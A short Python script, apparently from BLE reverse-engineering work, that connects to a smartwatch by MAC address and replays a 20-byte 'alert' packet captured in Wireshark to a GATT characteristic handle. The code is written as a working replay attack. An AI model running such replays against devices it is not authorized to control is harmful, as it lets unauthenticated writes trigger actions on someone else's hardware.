import asyncio
from bleak import BleakClient

# Configuration from your environment logs
MAC = "A1:B2:CC:09:78:0F"
TARGET_HANDLE = 0x0010  # From Wireshark Frame 978

# The exact 20-byte payload isolated from the target frame value
PAYLOAD = bytes.fromhex("00ff000104090000010001000000000000000000")

async def main():
    print(f"[*] Targeting watch peripheral [{MAC}] looking for Handle [{hex(TARGET_HANDLE)}]...")
    try:
        async with BleakClient(MAC, timeout=10.0) as client:
            if client.is_connected:
                print("[+] Connection established successfully.")
                
                # Resolve the integer handle to a Bleak Characteristic object
                target_char = None
                for service in client.services:
                    for char in service.characteristics:
                        if char.handle == TARGET_HANDLE:
                            target_char = char
                            break
                
                if target_char is not None:
                    print(f"[+] Found Characteristic UUID: {target_char.uuid} at handle {hex(TARGET_HANDLE)}")
                    print("[!] Replaying isolated alert signature packet...")
                    
                    # Write using the resolved characteristic object
                    await client.write_gatt_char(target_char, PAYLOAD, response=False)
                    
                    print("[+] Packet injected into transmission queue.")
                    await asyncio.sleep(1.0)  # Hold link briefly to ensure execution
                else:
                    print(f"[-] Could not find a GATT characteristic mapping to handle {hex(TARGET_HANDLE)}")
                    print("[*] Available handles:")
                    for service in client.services:
                        for char in service.characteristics:
                            print(f"  Handle {hex(char.handle)}: {char.uuid}")
            else:
                print("[-] Failed to establish a stable link state.")
    except Exception as e:
        print(f"[-] Transmission Error: {e}")

if __name__ == "__main__":
    asyncio.run(main())
